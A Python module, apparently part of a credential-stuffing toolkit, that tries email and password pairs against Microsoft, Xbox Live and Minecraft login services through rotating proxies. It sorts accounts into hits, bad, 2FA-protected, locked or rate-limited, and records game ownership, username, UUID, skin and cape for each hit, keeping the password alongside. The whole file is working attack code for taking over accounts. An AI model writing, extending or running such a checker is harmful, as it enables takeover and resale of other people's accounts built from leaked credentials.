"""
╔══════════════════════════════════════════╗
║   MINECRAFT CHECKER (Xbox + MC API)     ║
║          MADE BY - @NUTFRR              ║
╚══════════════════════════════════════════╝
Microsoft OAuth2 → Xbox auth → Minecraft auth → MC profile
Checks: owns Java, owns Bedrock, username, UUID, skin, cape
"""
import requests

MS_LOGIN_URL  = "https://login.live.com/oauth20_authorize.srf"
XBL_URL       = "https://user.auth.xboxlive.com/user/authenticate"
XSTS_URL      = "https://xsts.auth.xboxlive.com/xsts/authorize"
MC_AUTH_URL   = "https://api.minecraftservices.com/authentication/login_with_xbox"
MC_ENTITLE    = "https://api.minecraftservices.com/entitlements/mcstore"
MC_PROFILE    = "https://api.minecraftservices.com/minecraft/profile"

STATUS_HIT    = "HIT"
STATUS_BAD    = "BAD"
STATUS_2FA    = "2FA"
STATUS_LOCKED = "LOCKED"
STATUS_RATE   = "RATELIMIT"
STATUS_ERROR  = "ERROR"
STATUS_NO_MC  = "NO_MINECRAFT"


def _s(proxy=None):
    s = requests.Session()
    s.timeout = 15
    if proxy:
        p = proxy if proxy.startswith("http") else f"http://{proxy}"
        s.proxies = {"http": p, "https": p}
    return s


def _ms_login(email: str, password: str, proxy=None) -> dict:
    """Reuse same flow as xbox_checker ms_login."""
    from checkers.xbox_checker import ms_login, _exchange_code
    return ms_login(email, password, proxy)


def _get_xbl(access_token: str, proxy=None) -> dict:
    from checkers.xbox_checker import get_xbox_user_token
    return get_xbox_user_token(access_token, proxy)


def _get_xsts_mc(user_token: str, proxy=None) -> dict:
    """Get XSTS token with Minecraft relying party."""
    s = _s(proxy)
    try:
        r = s.post(XSTS_URL, json={
            "Properties": {
                "SandboxId":  "RETAIL",
                "UserTokens": [user_token],
            },
            "RelyingParty": "rp://api.minecraftservices.com/",
            "TokenType": "JWT",
        }, headers={"Content-Type": "application/json", "Accept": "application/json"})
        d = r.json()
        xerr = d.get("XErr", 0)
        if xerr == 2148916233:
            return {"status": STATUS_NO_MC, "detail": "no_xbox_account"}
        if xerr == 2148916238:
            return {"status": STATUS_LOCKED, "detail": "child_account"}
        return {
            "status": "ok",
            "token": d.get("Token", ""),
            "uhs":   d.get("DisplayClaims", {}).get("xui", [{}])[0].get("uhs", ""),
        }
    except Exception as e:
        return {"status": STATUS_ERROR, "detail": str(e)}


def _mc_auth(xsts_token: str, uhs: str, proxy=None) -> str | None:
    """Login to Minecraft with Xbox XSTS token."""
    s = _s(proxy)
    try:
        r = s.post(MC_AUTH_URL, json={
            "identityToken": f"XBL3.0 x={uhs};{xsts_token}"
        }, headers={"Content-Type": "application/json"})
        return r.json().get("access_token")
    except Exception:
        return None


def _mc_entitlements(mc_token: str, proxy=None) -> dict:
    """Check if account owns Java / Bedrock."""
    s = _s(proxy)
    result = {"java": False, "bedrock": False}
    try:
        r = s.get(MC_ENTITLE, headers={"Authorization": f"Bearer {mc_token}"})
        for item in r.json().get("items", []):
            name = item.get("name", "").lower()
            if "java" in name or "game_minecraft" in name:
                result["java"] = True
            if "bedrock" in name or "dungeons" in name:
                result["bedrock"] = True
    except Exception:
        pass
    return result


def _mc_profile(mc_token: str, proxy=None) -> dict:
    """Get Minecraft username, UUID, skin, cape."""
    s = _s(proxy)
    try:
        r = s.get(MC_PROFILE, headers={"Authorization": f"Bearer {mc_token}"})
        d = r.json()
        if "error" in d:
            return {"has_profile": False}
        skin_url = ""
        cape_url = ""
        for skin in d.get("skins", []):
            if skin.get("state") == "ACTIVE":
                skin_url = skin.get("url", "")
        for cape in d.get("capes", []):
            if cape.get("state") == "ACTIVE":
                cape_url = cape.get("url", "")
        return {
            "has_profile": True,
            "username":    d.get("name", ""),
            "uuid":        d.get("id", ""),
            "skin_url":    skin_url,
            "cape_url":    cape_url,
            "has_cape":    bool(cape_url),
        }
    except Exception:
        return {"has_profile": False}


def check_minecraft(email: str, password: str, proxy=None) -> dict:
    base = {"email": email, "password": password, "checker": "minecraft"}

    from checkers.xbox_checker import ms_login, _exchange_code
    login = ms_login(email, password, proxy)
    st    = login.get("status")

    if st == "BAD":     return {**base, "status": STATUS_BAD}
    if st == "2FA":     return {**base, "status": STATUS_2FA}
    if st == "LOCKED":  return {**base, "status": STATUS_LOCKED}
    if st == "RATELIMIT": return {**base, "status": STATUS_RATE}
    if st not in ("CODE", "TOKEN"):
        return {**base, "status": st or STATUS_ERROR}

    sess         = login.get("session")
    access_token = login.get("access_token") or _exchange_code(login.get("code", ""), sess)
    if not access_token:
        return {**base, "status": STATUS_ERROR, "detail": "no_access_token"}

    xbl  = _get_xbl(access_token, proxy)
    if not xbl.get("token"):
        return {**base, "status": STATUS_NO_MC}

    xsts = _get_xsts_mc(xbl["token"], proxy)
    if xsts.get("status") != "ok":
        return {**base, "status": xsts.get("status", STATUS_ERROR)}

    mc_token = _mc_auth(xsts["token"], xsts["uhs"], proxy)
    if not mc_token:
        return {**base, "status": STATUS_NO_MC}

    entitle = _mc_entitlements(mc_token, proxy)
    if not entitle["java"] and not entitle["bedrock"]:
        return {**base, "status": STATUS_NO_MC, "detail": "no_game_owned"}

    profile = _mc_profile(mc_token, proxy)

    return {
        **base,
        "status":    STATUS_HIT,
        "username":  profile.get("username", ""),
        "uuid":      profile.get("uuid", ""),
        "java":      entitle["java"],
        "bedrock":   entitle["bedrock"],
        "has_cape":  profile.get("has_cape", False),
        "cape_url":  profile.get("cape_url", ""),
        "skin_url":  profile.get("skin_url", ""),
    }
